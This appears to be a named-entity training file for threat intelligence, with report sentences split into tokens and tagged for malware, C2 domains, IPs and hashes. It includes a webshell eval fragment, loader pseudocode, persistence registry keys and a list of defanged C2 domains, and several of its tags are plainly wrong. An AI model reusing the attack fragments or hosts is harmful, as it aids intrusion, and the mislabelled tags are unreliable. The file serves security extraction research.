leaders	O
in	O
Information	O
Security	O
area-Bruce	O
Schiner	O
said	O
,	O
'	O
when	O
big	O
events	O
on	O
information	O
security	O
happened	O
,	O
people	O
tend	O
to	O
treat	O
it	O
as	O
an	O
example	O
of	O
cyber	O
warfare	O
.	O

In	O
order	O
to	O
determine	O
the	O
intrusion	O
set	O
involved	O
with	O
the	O
Cmstar	B-malware.unknown
,	O
Unit	O
42	O
enumerated	O
infrastructure	O
used	O
by	O
the	O
downloader	O
for	O
its	O
C2	O
servers	O
.	O

Stuxnet	B-malware.backdoor
used	O
the	O
key	O
'	O
MRxCls	O
'	O
and	O
the	O
value	O
'	O
Data	O
'	O
,	O
while	O
in	O
the	O
case	O
of	O
rtniczw.sys	O
,	O
the	O
key	O
was	O
'	O
rtniczw	O
'	O
and	O
the	O
value	O
was	O
'	O
Config	O
'	O
.	O

A	O
great	O
deal	O
of	O
research	O
about	O
this	O
group	O
was	O
published	O
last	O
year	O
,	O
including	O
papers	O
such	O
as	O
those	O
from	O
CyberReason	O
,	O
a	O
lengthy	O
global	O
view	O
from	O
FireEye	O
and	O
the	O
watering-hole	O
explanation	O
from	O
Volexity	O
.	O

Domain	O
Registration	O
Information	O
:	O

The	O
developer	O
used	O
the	O
same	O
C2	O
infrastructure	O
all	O
this	O
time	O
.	O

EARLY	O
AUG	O
AUG	O
10	O
AUG	O
25-SEP	O
12	O

This	O
vulnerability	O
affects	O
the	O
latest	O
version	O
of	O
Internet	O
Explorer	O
and	O
applications	O
that	O
use	O
the	O
IE	O
kernel	O
.	O

Just	O
like	O
Bahraini	O
samples	O
,	O
the	O
malware	O
relocates	O
itself	O
and	O
drops	O
a	O
JPG	O
image	O
with	O
the	O
same	O
filename	O
as	O
the	O
sample	O
when	O
executed	O
by	O
an	O
unsuspecting	O
user	O
.	O

Sideloaded	O
libraries	O

-	O
[	O
Keylogger	O
activeAppDidChange	O
:	O
]	O
-	O
[	O
Keylogger	O
addNotificationForActiveApp	O
]	O
-	O
[	O
Keylogger	O
checkAccesibility	O
]	O
-	O
[	O
Keylogger	O
checkSpecialKey	O
:	O
]	O
-	O
[	O
Keylogger	O
disableLogging	O
]	O
-	O
[	O
Keylogger	O
enableLogging	O
]	O
-	O
[	O
Keylogger	O
initEventTapAndStartRunLoop	O
]	O
-	O
[	O
Keylogger	O
keyPressedeventMonitor	O
]	O
-	O
[	O
Keylogger	O
pressedKeyWithKeyCode	O
:	O
andModifiers	O
:	O
]	O
-	O
[	O
Keylogger	O
removeNotificationForActiveApp	O
]	O
-	O
[	O
Keylogger	O
sendLog	O
]	O
-	O
[	O
Keylogger	O
setAccessibilityApplication	O
]	O
-	O
[	O
Keylogger	O
setKeyPressedeventMonitor	O
:	O
]	O
-	O
[	O
Keylogger	O
start	O
]	O
-	O
[	O
Keylogger	O
status	O
]	O
-	O
[	O
Keylogger	O
stop	O
]	O

Message	O
body	O
'	O
Police	O
Department	O
'	O
<	O
cmmds@sbt.co[.]in	O
>	O
Transfer	O
Investigation	O
report	O
Mon	O
,	O
05	O
May	O
2014	O
07:34:35	O
-0700	O
reports-pdf.jar	B-malware.infosteal
We	O
recieved	O
a	O
report	O
against	O
the	O
attached	O
transaction	O
in	O
your	O
exchange	O
house	O
,	O
Kindly	O
report	O
to	O
our	O
nearest	O
station	O
immedietly	O
.	O

OceanLotus	O
:	O
old	O
techniques	O
,	O
new	O
backdoor	O

This	O
made	O
us	O
believe	O
the	O
two	O
groups	O
were	O
connected	O
,	O
although	O
it	O
looks	O
they	O
split	O
ways	O
at	O
a	O
certain	O
point	O
,	O
with	O
the	O
original	O
Miniduke	B-malware.backdoor
group	O
switching	O
to	O
the	O
CosmicDuke	B-malware.backdoor
implant	O
in	O
2014	O
.	O

'	O
Server-side	O
Payload	O
Component	O
'	O
on	O
Page	O
5	O
showed	O
China	B-malware.backdoor
Chopper	I-malware.backdoor
executing	O
on	O
a	O
Windows	O
2003	O
IIS	O
server	O
using	O
ASPX	O
.	O

Use	O
caution	O
and	O
exercise	O
due	O
diligence	O
when	O
faced	O
with	O
a	O
shortened	O
link	O
,	O
especially	O
in	O
unsolicited	O
email	O
messages	O
.	O

You	O
can	O
easily	O
decode	O
the	O
content	O
of	O
the	O
payload	O
with	O
the	O
following	O
Python	O
snippet	O
:	O
The	O
previous	O
packet	O
decodes	O
to	O
the	O
following	O
:	O
$	O
login	O
$	O
192.168.56.101	B-ip.unknown
MyUser	O
2013/06/06	O
23:56:24	O
Proxy	O
20130401	O
While	O
reverse	O
engineering	O
the	O
backdoor	O
we	O
noticed	O
that	O
the	O
malware	O
expects	O
the	O
following	O
messages	O
from	O
the	O
C	O
&	O
C	O
server	O
it	O
contacts	O
:	O
Sysinfo	O
FileManager	O
Download	O
UploadFileOk	O
Shell	O
Intrigued	O
by	O
its	O
capabilities	O
,	O
we	O
started	O
reconstructing	O
the	O
communication	O
protocol	O
and	O
practically	O
building	O
a	O
tool	O
that	O
would	O
operate	O
just	O
like	O
the	O
original	O
controller	O
used	O
by	O
the	O
attackers	O
.	O

If	O
the	O
backdoor	O
fails	O
to	O
connect	O
five	O
times	O
,	O
or	O
if	O
it	O
connects	O
,	O
but	O
the	O
task	O
it	O
receives	O
is	O
'	O
vykhodit	O
'	O
(	O
'	O
exit	O
communication	O
session	O
'	O
)	O
,	O
then	O
the	O
backdoor	O
will	O
quit	O
.	O

Additionally	O
,	O
all	O
the	O
malicious	O
Office	O
documents	O
,	O
and	O
more	O
specifically	O
the	O
documents	O
used	O
to	O
test	O
anti-virus	O
on	O
VirusTotal	O
,	O
were	O
submitted	O
from	O
Pakistan	O
.	O

years	O
in	O
the	O
late	O
1980s	O
and	O
early	O
1990s	O
)	O
,	O
and	O
others	O
seem	O
to	O
match	O
what	O
year	O
the	O
malware	O
was	O
launched	O
in	O
(	O
ie	O
.	O

We	O
've	O
also	O
seen	O
:	O

Name	O
SHA256	O
File	O
Size	O

21	O
.	O

State-Sponsored	O
Malware	O
,	O
'	O
Electronic	O
Frontier	O
Foundation	O
,	O
'	O
https://www.eff.org/issues/state-sponsored-malware	O
.	O

In	O
order	O
to	O
disguise	O
the	O
nature	O
of	O
the	O
attachments	O
a	O
malicious	O
usage	O
of	O
the	O
'	O
righttoleftoverride	O
'	O
(	O
RLO	O
)	O
character	O
was	O
employed	O
.	O

IP	O
Addresses	O
:	O

It	O
will	O
then	O
subtract	O
0x37	O
from	O
the	O
source	O
byte	O
and	O
save	O
the	O
result	O
into	O
the	O
current	O
index	O
within	O
the	O
output	O
buffer	O
:	O

In	O
the	O
first	O
case	O
with	O
the	O
'	O
Goldstager	O
'	O
string	O
and	O
with	O
the	O
string	O
'	O
Coinstager	O
'	O
in	O
the	O
second	O
.	O

Arayan은	B-malware.backdoor
2015년에	O
발견되었으며	O
,	O
'	O
F**k	O
Hack	O
Hound.'이라는	O
문자열을	O
포함하고	O
있는	O
것이	O
특징이다	O
.	O

This	O
feature	O
allows	O
installing	O
further	O
malware	O
on	O
the	O
affected	O
PC	O
in	O
case	O
the	O
attackers	O
decide	O
the	O
current	O
machine	O
is	O
interesting	O
enough	O
.	O

Fig	O
2	O
.	O

Visitors	O
may	O
have	O
been	O
directed	O
to	O
the	O
site	O
by	O
other	O
means	O
and	O
downloaded	O
directly	O
from	O
the	O
ripped	O
and	O
persuasive	O
site	O
.	O

The	O
first	O
part	O
of	O
the	O
campaign	O
(	O
From	O
Jan	O
.	O

All	O
of	O
these	O
HTRAN	O
servers	O
were	O
located	O
in	O
the	O
Guangdong	O
Province	O
and	O
operated	O
by	O
CHINANET	O
.	O

However	O
,	O
the	O
attackers	O
'	O
IP-addresses	O
do	O
provide	O
some	O
additional	O
clues	O
.	O

Trend	O
Micro	O
Cyber	O
Safety	O
Solutions	O
Team	O

Moreover	O
,	O
the	O
executable	O
implements	O
a	O
persistence	O
mechanism	O
by	O
setting	O
the	O
registry	O
key	O
:	O

AdobeWpkReg.tmp	O
Downloader	O
Uses	O
HEAD	O
method	O
(	O
instead	O
of	O
GET	O
)	O
|	O
Calls	O
out	O
to	O
info.winupdate[.]net/robots.txt	B-url.cncsvr
|	O
User-Agent	O
:	O
Mozilla/5.0	O
(	O
compatible	O
;	O
MSIE	O
10.0	O
;	O
NULL	O
[	O
5	O
(	O
1	O
)	O
]	O
Windows	O
NT	O
6.1	O
;	O
Trident/6.0	O
)	O

Hosts	O
in	O
five	O
domains	O
of	O
organizations	O
based	O
in	O
Iran	O
were	O
heavily	O
infected	O
over	O
3	O
attack	O
waves	O
.	O

Initially	O
,	O
CyberX	O
saw	O
similarities	O
between	O
Operation	O
BugDrop	O
and	O
a	O
previous	O
cyber-surveillance	O
operation	O
discovered	O
by	O
ESET	O
in	O
May	O
2016	O
called	O
Operation	O
Groundbait	O
.	O

According	O
to	O
a	O
study	O
by	O
the	O
Australian	O
DSD	O
,	O
85	O
%	O
of	O
the	O
targeted	O
attacks	O
analysed	O
could	O
have	O
been	O
stopped	O
by	O
four	O
simple	O
defense	O
strategies	O
.	O

Password=Response.Write	O
(	O
'	O
-	O
>	O
|	O
'	O
)	O
;	O
var	O
err	O
:	O
Exception	O
;	O
try	O
{	O
eval	O
(	O
System.Text.Encoding.GetEncoding	O
(	O
65001	O
)	O
.	O

users	O
name	O
and	O
password	O

The	O
second	O
value	O
is	O
the	O
4-byte	O
version	O
ID	O
.	O

In	O
Microsoft	O
Windows	O
XP	O
Service	O
Pack	O
2	O
(	O
SP2	O
)	O
and	O
Microsoft	O
Windows	O
XP	O
Tablet	O
PC	O
Edition	O
2005	O
,	O
DEP	O
is	O
enforced	O
by	O
hardware	O
and	O
by	O
software	O
.	O

McUtil.dll	O
variant	O
uses	O
a	O
different	O
technique	O
.	O

McAfee	O
Network	O
Security	O
Platform	O
The	O
UDS	O
release	O
of	O
January	O
14	O
contains	O
the	O
signature	O
'	O
UDS-HTTP	O
:	O
Microsoft	O
Internet	O
Explorer	O
HTML	O
DOM	O
Memory	O
Corruption	O
,	O
'	O
which	O
provides	O
coverage	O
.	O

173.254.236.130	B-ip.unknown
United	O
States	O
Los	O
Angeles	O
Graeme	O
Tee	O
,	O
QuadraNet	O
,	O
Inc	O

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\'Acroread	O
'	O
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\'Adobe	O
Update	O
'	O
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\'AdobeCheck	O
'	O
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\'AdobeCom	O
'	O
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\'IMSCMig	O
'	O
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\'McUpdate	O
'	O
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\'Register	O
'	O
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\'SysTray	O
'	O
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\'systemupdate	O
'	O
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\'wininstaller	O
'	O
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\'APVSVC	O
'	O
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\'AdobeUpdate	O
'	O

Record	O
#	O
3	O
Length	O
:	O
95	O
bytes	O
:	O

POST	O
/s/asp	O
?	O

These	O
tools	O
have	O
been	O
used	O
either	O
following	O
an	O
initial	O
DustySky	B-malware.drop
infection	O
,	O
or	O
by	O
themselves	O
.	O

Finally	O
,	O
this	O
Tipper	O
leverages	O
these	O
assessments	O
,	O
in	O
conjunction	O
with	O
more	O
recently	O
observed	O
activity	O
by	O
Russia-based	O
adversaries	O
,	O
to	O
determine	O
the	O
potential	O
for	O
any	O
future	O
activity	O
in	O
the	O
mobile	O
malware	O
threat	O
space	O
.	O

Our	O
telemetry	O
reveals	O
that	O
East-Asian	O
countries	O
such	O
as	O
Vietnam	O
,	O
the	O
Philippines	O
,	O
Laos	O
and	O
Cambodia	O
,	O
are	O
the	O
most	O
targeted	O
.	O

(	O
hModule	O
)	O
wininet.dll	O
=	O
decrypt_string	O
(	O
&	O
enc_wininet_dll	O
)	O
;	O
hModule	O
=	O
LoadLibraryA	O
(	O
wininet.dll	O
)	O
;	O
decode_functions_and_start_internet_loop	O
(	O
)	O
30	O
}	O
lpProcName	O
=	O
decrypt_string	O
(	O
&	O
enc_InternetOpenA	O
)	O
;	O
InternetOpenA	O
=	O
GetProcAddress	O
(	O
hModule	O
,	O
lpProcName	O
=	O
decrypt_string	O
(	O
enc_InternetConnectA	O
)	O
;	O
InternetConnectA	O
=	O
GetProcAddress	O
(	O
hModule	O
,	O
lpProcName	O
=	O
decrypt_string	O
(	O
&	O
enc_InternetSetOptionA	O
)	O
;	O
InternetSetOptionA	O
=	O
GetProcAddress	O
(	O
hModule	O
,	O
lpProcName	O
=	O
decrypt_string	O
(	O
&	O
enc_HttpOpenRequestA	O
)	O
;	O
HttpOpenRequestA	O
=	O
GetProcAddress	O
(	O
hModule	O
,	O
lpProcName	O
=	O
decrypt_string	O
(	O
&	O
enc_HttpSendRequestA	O
)	O
;	O
HttpSendRequestA	O
=	O
GetProcAddress	O
(	O
hModule	O
,	O
lpProcName	O
=	O
decrypt_string	O
(	O
&	O
enc_HttpQueryInfoA	O
)	O
;	O
HttpQueryInfoA	O
=	O
GetProcAddress	O
(	O
hModule	O
,	O
lpProcName	O
=	O
decrypt_string	O
(	O
&	O
enc_InternetReadFile	O
)	O
;	O
InternetReadFile	O
=	O
GetProcAddress	O
(	O
hModule	O
,	O
lpProcName	O
=	O
decrypt_string	O
(	O
&	O
enc_InternetCloseHandle	O
)	O
;	O
InternetCloseHandle	O
=	O
GetProcAddress	O
(	O
hModule	O
,	O
port	O
=	O
parse_int	O
(	O
'	O
80	O
'	O
)	O
;	O
delay	O
=	O
parse_int	O
(	O
'	O
61	O
'	O
)	O
;	O
generate_identifier_and_setup_jumptable	O
(	O
&	O
instance	O
)	O
;	O
internet_loop	O
(	O
&	O
instance	O
)	O
;	O
ExitThread	O
(	O
0	O
)	O
;	O

createListingArrayFromDirectoryListingData	O
:	O
]	O

안랩의	O
상세	O
분석	O
결과	O
,	O
안다리엘	O
그룹과	O
오퍼레	O
이션	O
블랙	O
마인의	O
공격	O
방식	O
등이	O
비슷하며	O
,	O
특히	O
zcon.exe	O
파일을	O
공통적으로	O
사용했음이	O
확인되었다	O
.	O

ChangeScriptName	O
FreeList	O
GetFileName	O
GetFilePath	O
GetFilePath2	O
GetFilePathNew	O
GetFilePathNew2	O
GetFolderPath	O
GetFolderPath2	O
GetFolderPathNew	O
GetFolderPathNew2	O
GetPathVariable	O
GetPathVariableList	O
GetSIDList	O
Initialize	O
Initialize_IjDEJK	O
Lock	O
NbhgHUxiGf	O
UnInitialize	O
rGBKikBeJObSwSjY	O

Most	O
RATs	B-malware.backdoor
are	O
easy	O
to	O
use	O
and	O
thus	O
attract	O
novices	O
.	O

Following	O
the	O
Green	O
Revolution	O
,	O
Iran	O
's	O
government	O
needed	O
to	O
quickly	O
improve	O
its	O
cyber	O
capabilities	O
,	O
but	O
according	O
to	O
Insikt	O
Group	O
's	O
source	O
,	O
the	O
talent	O
was	O
primarily	O
young	O
and	O
focused	O
on	O
financial	O
benefits	O
.	O

Notice	O
that	O
this	O
malware	O
targets	O
Windows	O
machines	O
and	O
not	O
Android	O
smartphones	O
.	O

As	O
shown	O
in	O
Figure	O
8	O
,	O
I	O
successfully	O
added	O
an	O
administrative	O
user	O
while	O
remotely	O
connected	O
via	O
my	O
custom	O
Gh0st	B-malware.backdoor
RAT	I-malware.backdoor
console	O
within	O
the	O
malware	O
dropped	O
from	O
sample	O
f9a669d22866cd041e2d520c5eb093188962bea8864fdfd0c0abb2b254e9f197	B-hash
.	O

Drops	O
and	O
execute	O
batch	O
file	O
:	O
schedules	O
downloader	O
every	O
30	O
minutes	O
and	O
ensures	O
svchest.exe	O
started	O
with	O
Local	O
System	O
privileges	O
.	O

img.gmailtagmanager[.]com	B-url.cncsvr
windowkernel[.]com	B-url.cncsvr
windowslayer[.]in	B-url.cncsvr
windowkernel[.]com	B-url.cncsvr
wheatherserviceapi[.]info	B-url.cncsvr
wethearservice[.]com	B-url.cncsvr
windowslayer[.]in	B-url.cncsvr
u[.]mywindows24[.]in	B-url.cncsvr
main[.]windowskernel14[.]com	B-url.cncsvr
walla[.]link	B-url.cncsvr
heartax[.]info	B-url.cncsvr
haaretz[.]link	B-url.cncsvr
Haaretz-News[.]com	B-url.cncsvr
gmailtagmanager[.]com	B-url.cncsvr
fbstatic-a[.]xyz	B-url.cncsvr
fbstatic-a[.]space	B-url.cncsvr
fbstatic-akamaihd[.]com	B-url.cncsvr
alhadath[.]mobi	B-url.cncsvr
big-windowss[.]com	B-url.cncsvr
kernel4windows[.]in	B-url.cncsvr
micro-windows[.]in	B-url.cncsvr
mywindows24[.]in	B-url.cncsvr
patch7-windows[.]com	B-url.cncsvr
patch8-windows[.]com	B-url.cncsvr
patchthiswindows[.]com	B-url.cncsvr
windows-10patch[.]in	B-url.cncsvr
windows-drive20[.]com	B-url.cncsvr
windows-india[.]in	B-url.cncsvr
windows-kernel[.]in	B-url.cncsvr
windows-my50[.]com	B-url.cncsvr
windows24-kernel[.]in	B-url.cncsvr
windowskernel[.]in	B-url.cncsvr
windowslayer[.]in	B-url.cncsvr
windowssup[.]in	B-url.cncsvr
windowsupup[.]com	B-url.cncsvr
mswordupdate15[.]com	B-url.cncsvr
(	O
currently	O
sinkholed	O
by	O
Kaspersky	O
)	O
mswordupdate16[.]com	B-url.cncsvr
(	O
currently	O
sinkholed	O
by	O
Kaspersky	O
)	O
mswordupdate17[.]com	B-url.cncsvr
(	O
currently	O
sinkholed	O
by	O
Kaspersky	O
)	O
cacheupdate14[.]com	B-url.cncsvr
(	O
currently	O
sinkholed	O
by	O
Kaspersky	O
)	O
windowskernel14[.]com	O
(	O
currently	O
sinkholed	O
by	O
Kaspersky	O
)	O

This	O
is	O
a	O
malicious	O
DLL	O
that	O
belongs	O
to	O
the	O
same	O
malware	O
family	O
as	O
the	O
one	O
dropped	O
by	O
'	O
4f4bf27b738ff8f2a89d1bc487b054a8	O
'	O
,	O
and	O
is	O
almost	O
byte-by-byte	O
exactly	O
similar	O
except	O
for	O
the	O
fact	O
that	O
it	O
beacons	O
to	O
a	O
different	O
C2	O
domain	O
mail.cbppnews[.]com	B-url.unknown
.	O

>	O
c	O
:	O
\Tools	O
>	O
–	O

Threat	O
Analysts	O
discovered	O
what	O
appeared	O
to	O
be	O
a	O
targeted	O
spearfishing	B-url.cncsvr
domain	I-url.cncsvr
aimed	O
at	O
a	O
financial	O
institution	O
.	O

In	O
January	O
2015	O
,	O
unidentified	O
attackers	O
attempted	O
to	O
infiltrate	O
a	O
multi-national	O
enterprise	O
based	O
in	O
the	O
United	O
Arab	O
Emirates	O
,	O
using	O
a	O
spear	O
phishing	O
attack	O
with	O
a	O
crafted	O
MS	O
Word	O
document	O
attached	O
to	O
the	O
message	O
.	O

During	O
that	O
attack	O
,	O
those	O
behind	O
TeleBots	O
enhanced	O
their	O
arsenal	O
with	O
two	O
pieces	O
of	O
ransomware	O
and	O
updated	O
versions	O
of	O
tools	O
mentioned	O
in	O
the	O
previously-linked	O
blogposts	O
.	O

When	O
the	O
connection	O
is	O
established	O
a	O
new	O
thread	O
is	O
spawned	O
that	O
starts	O
with	O
the	O
MainConnectionIo	O
function	O
.	O

No	O
changes	O
to	O
the	O
compression	O
have	O
been	O
found	O
;	O
however	O
,	O
it	O
is	O
trivial	O
to	O
implement	O
a	O
modified	O
compression	O
protocol	O
.	O

Domain	O
used	O
for	O
various	O
stages	O
of	O
the	O
exploit	O
chain	O
.	O

TRITON	B-malware.infosteal
is	O
consistent	O
with	O
these	O
attacks	O
,	O
in	O
that	O
it	O
could	O
prevent	O
safety	O
mechanisms	O
from	O
executing	O
their	O
intended	O
function	O
,	O
resulting	O
in	O
a	O
physical	O
consequence	O
.	O

For	O
example	O
,	O
if	O
the	O
DLL	O
is	O
loaded	O
into	O
the	O
address	O
space	O
of	O
svchost.exe	O
,	O
the	O
constructed	O
filename	O
will	O
be	O
:	O

While	O
initially	O
we	O
thought	O
the	O
same	O
,	O
currently	O
we	O
can	O
not	O
relate	O
Operation	O
Electric	O
Powder	O
to	O
any	O
known	O
group	O
.	O

Versioning	O
is	O
possible	O
.	O

Table	O
of	O
Contents	O

DerusbiThread	O
:	O
:DerusbiThread	O
begins	O
by	O
generating	O
a	O
PCC_SOCK	O
object	O
.	O

Malware	O
coverage	O
is	O
out	O
of	O
scope	O
.	O

We	O
are	O
releasing	O
python	O
scripts	O
we	O
have	O
developed	O
to	O
gather	O
the	O
configuration	O
details	O
for	O
various	O
versions	O
of	O
XtremeRAT	B-malware.backdoor
from	O
both	O
process	O
memory	O
dumps	O
and	O
the	O
encrypted	O
configuration	O
file	O
on	O
disk	O
.	O

In	O
the	O
below	O
screen	O
shot	O
the	O
URL	O
(	O
hxxp://c2xy.com/a.exe	B-url.unknown
)	O
is	O
not	O
the	O
actual	O
URL	O
used	O
by	O
the	O
malware	O
for	O
downloading	O
the	O
file	O
,	O
this	O
is	O
a	O
test	O
URL	O
used	O
to	O
determine	O
the	O
functionality	O
,	O
so	O
this	O
URL	O
should	O
not	O
used	O
as	O
an	O
indicator	O
.	O

Table	B-malware.unknown
1	O
:	O
Pyinstaller	O
Artifacts	O
The	O
remaining	O
dropper	O
,	O
update.exe	O
,	O
contains	O
the	O
artifacts	O
listed	O
in	O
Table	B-malware.unknown
2	O
.	O

The	O
two	O
branches	O
(	O
for	O
handling	O
digits	O
and	O
upper-case	O
A	O
through	O
F	O
)	O
will	O
then	O
re-join	O
,	O
and	O
the	O
resulting	O
integer/hexadecimal	O
representation	O
of	O
the	O
first	O
source	O
byte	O
will	O
be	O
left-shifted	O
by	O
four	O
(	O
thus	O
multiplying	O
it	O
by	O
16	O
)	O
:	O

The	O
attacker	O
's	O
objective	O
is	O
to	O
make	O
analysis	O
di cult	O
and	O
to	O
evade	O
detection	O
technologies	O
that	O
rely	O
on	O
pattern	O
matching	O
.	O

Carefully	O
consider	O
the	O
risks	O
before	O
granting	O
administrative	O
rights	O
to	O
users	O
on	O
their	O
own	O
machines	O
.	O

MDM	B-malware.infosteal
allows	O
for	O
operating	O
system-level	O
control	O
of	O
multiple	O
devices	O
from	O
a	O
centralized	O
location	O
.	O

The	O
campaign	O
keywords	O
are	O
not	O
sent	O
out	O
in	O
version	O
'	O
p=1	O
'	O
but	O
can	O
still	O
be	O
found	O
hardcoded	O
in	O
the	O
DLL	O
payload	O
.	O

We	O
assume	O
that	O
due	O
to	O
the	O
G	O
DATA	O
publication	O
in	O
February	O
2014	O
,	O
the	O
author	O
decided	O
to	O
remove	O
as	O
many	O
links	O
as	O
possible	O
between	O
Uroburos	B-malware.backdoor
and	O
Agent.BTZ/ComRAT/Chinch	B-malware.backdoor
;	O
The	O
authors	O
do	O
not	O
generate	O
logs	O
anymore	O
;	O
The	O
compilation	O
date	O
has	O
been	O
modified	O
,	O
in	O
order	O
to	O
make	O
the	O
analysis	O
and	O
timeline	O
creation	O
more	O
complex	O
.	O

These	O
breaches	O
involved	O
the	O
theft	O
of	O
internal	O
data	O
-	O
mostly	O
emails	O
–	O
that	O
was	O
later	O
strategically	O
leaked	O
through	O
multiple	O
forums	O
and	O
propagated	O
in	O
a	O
calculated	O
manner	O
almost	O
certainly	O
intended	O
to	O
advance	O
particular	O
Russian	O
Government	O
aims	O
.	O

As	O
of	O
October	O
2014	O
,	O
the	O
Symantec	O
Corporation	O
had	O
reported	O
an	O
increased	O
use	O
of	O
spear-phishing	O
emails	O
containing	O
malware	O
targeted	O
against	O
financial	O
institutions	O
.	O

We	O
also	O
discovered	O
that	O
the	O
'	O
upnphost.exe	O
'	O
file	O
was	O
submitted	O
to	O
Virus	O
Total	O
by	O
us	O
,	O
likely	O
because	O
the	O
evasion	O
technique	O
implemented	O
by	O
the	O
dropper	O
.	O

This	O
domain	O
is	O
registered	O
on	O
the	O
registrant	O
sakanika@rediffmail[.]com	B-url.unknown
.	O

Table	O
A-1	O
:	O
The	O
user	O
matches	O
the	O
computer	O
name	O
and	O
user	O
name	O
as	O
listed	O
.	O

Many	O
different	O
algorithms	O
exist	O
for	O
binary	O
similarity	O
calculation	O
,	O
but	O
we	O
are	O
going	O
to	O
use	O
one	O
of	O
the	O
simplest	O
approach	O
here	O
.	O

Product	O
&	O
Description	O
:	O
JpgAsp	O

Nothing	O
contained	O
herein	O
should	O
be	O
relied	O
on	O
or	O
acted	O
upon	O
without	O
the	O
benefit	O
of	O
legal	O
advice	O
based	O
on	O
the	O
particular	O
facts	O
and	O
circumstances	O
presented	O
and	O
nothing	O
herein	O
should	O
be	O
construed	O
otherwise	O
.	O

MyApp	O
is	O
a	O
regular	O
iOS	O
app	O
.	O

This	O
group	O
is	O
known	O
for	O
its	O
technique	O
of	O
registering	O
domains	O
that	O
closely	O
resemble	O
domains	O
of	O
legitimate	O
organizations	O
they	O
plan	O
to	O
target	O
.	O

There	O
seems	O
to	O
be	O
a	O
number	O
of	O
people	O
involved	O
in	O
creating	O
these	O
bait	O
files	O
.	O

Further	O
web	O
browsing	O
activity	O
from	O
IHU	O
ranges	O
was	O
noted	O
to	O
the	O
website	O
of	O
a	O
U.S.-based	O
multinational	O
engineering	O
software	O
company	O
,	O
Gamma	O
Technologies	O
.	O

Iron	B-malware.backdoor
Backdoor	I-malware.backdoor
itself	O
embeds	O
adblockplusie	O
–	O
Adblock	O
Plus	O
for	O
IE	O
,	O
which	O
is	O
modified	O
in	O
a	O
similar	O
way	O
to	O
the	O
malicious	O
chrome	O
extension	O
,	O
injecting	O
remote	O
javascript	O
.	O

In	O
and	O
of	O
itself	O
,	O
the	O
Derusbi	B-malware.backdoor
server	O
variant	O
is	O
a	O
largely	O
unremarkable	O
RAT	B-malware.backdoor
when	O
viewed	O
from	O
the	O
perspective	O
of	O
functional	O
capabilities	O
.	O

Tools	O
used	O
in	O
the	O
campaign	O
:	O

def	O
hashStr	O
(	O
st	O
)	O
:	O
hash	O
=	O
0	O

한편	O
,	O
Andaratm는	B-malware.backdoor
다른	O
악성코드와	O
유사한	O
암호화	O
방식을	O
사용한다	O
.	O

3	O
The	O
EvilGrab	B-malware.drop
campaign	O
makes	O
use	O
of	O
this	O
vulnerability	O
for	O
its	O
AutoRun	B-malware.drop
routine	I-malware.drop
.	O

Undocumented	O
backdoor	O
that	O
used	O
Outlook	O
for	O
C2	O
communication	O
and	O
data	O
exfiltration	O
.	O

C	O
&	O
C	O
Statistics	O

Here	O
is	O
the	O
global	O
workflow	O
of	O
it	O
:	O

It	O
was	O
found	O
to	O
be	O
backdoored	O
by	O
Gh0st	B-malware.backdoor
RAT	I-malware.backdoor
and	O
exfiltrated	O
data	O
to	O
an	O
IP	O
in	O
China	O
.	O

Proactive	O
coverage	O
existed	O
for	O
some	O
components	O
(	O
as	O
'	O
Trojan.Crypt.XDR.Gen	O
'	O
)	O
.	O

The	O
other	O
issue	O
when	O
reverse-engineering	O
DUBNIUM	B-malware.drop
binaries	O
is	O
that	O
it	O
encodes	O
every	O
single	O
string	O
that	O
is	O
used	O
in	O
the	O
code	O
(	O
Figure	O
8	O
)	O
.	O

Our	O
data	O
indicates	O
that	O
the	O
majority	O
of	O
targeted	O
attack	O
victims	O
are	O
various	O
government	O
agencies	O
.	O

The	O
URI	O
is	O
constructed	O
by	O
appending	O
a	O
random	O
value	O
onto	O
a	O
format	O
string	O
(	O
Figure	O
6	O
)	O
,	O
whose	O
values	O
will	O
indicate	O
the	O
current	O
function	O
,	O
and	O
progress	O
within	O
the	O
function	O
,	O
that	O
is	O
transmitted	O
to	O
track	O
successes	O
and	O
failures	O
.	O

Configuring	O
the	O
Reflective	O
Loader	O
to	O
survive	O
reboots	O
and	O
process	O
exits	O
DNS	O
Command	O
and	O
Control	O
communication	O
Common	O
RAT	B-malware.backdoor
functionalities	O
Files	O
with	O
scr	O
extension	O
are	O
just	O
the	O
same	O
as	O
exe	O
executables	O
.	O

29	O
Dec	O
.	O

Command	O
Value	O
Command	O
char	O
Module	O

Figure	O
8	O
shows	O
a	O
document	O
written	O
in	O
Tajik	O
that	O
purports	O
to	O
be	O
from	O
the	O
Ministry	O
of	O
Internal	O
Affairs	O
of	O
the	O
Republic	O
of	O
Tajikistan	O
.	O

The	O
zip	O
file	O
extracts	O
to	O
a	O
MS	O
Windows	O
executable	O
file	O
.	O

23	O
,	O
2011	O
and	O
generates	O
the	O
following	O
'	O
Beebus	B-malware.infosteal
'	O
traffic	O
pattern	O
:	O

Both	O
domains	O
appear	O
to	O
be	O
of	O
legitimate	O
use	O
,	O
but	O
compromised	O
and	O
abused	O
to	O
host	O
Babar	O
's	O
server	O
side	O
infrastructure	O
.	O

Implant	O
directory	O
contained	O
in	O
the	O
malicious	O
Flash	O
file	O
.	O

Such	O
attack	O
can	O
be	O
launched	O
without	O
the	O
support	O
of	O
vector	O
file	O
,	O
in	O
fact	O
it	O
depends	O
on	O
network	O
projection	O
and	O
laterally	O
move	O
in	O
the	O
internal	O
network	O
as	O
required	O
conducting	O
an	O
attack	O
.	O

Alongside	O
evidence	O
of	O
compromise	O
of	O
the	O
organization	O
itself	O
,	O
Symantec	O
also	O
found	O
a	O
copy	O
of	O
one	O
of	O
the	O
company	O
's	O
own	O
 les	O
,	O
relating	O
to	O
its	O
messaging	O
software	O
,	O
on	O
a	O
staging	O
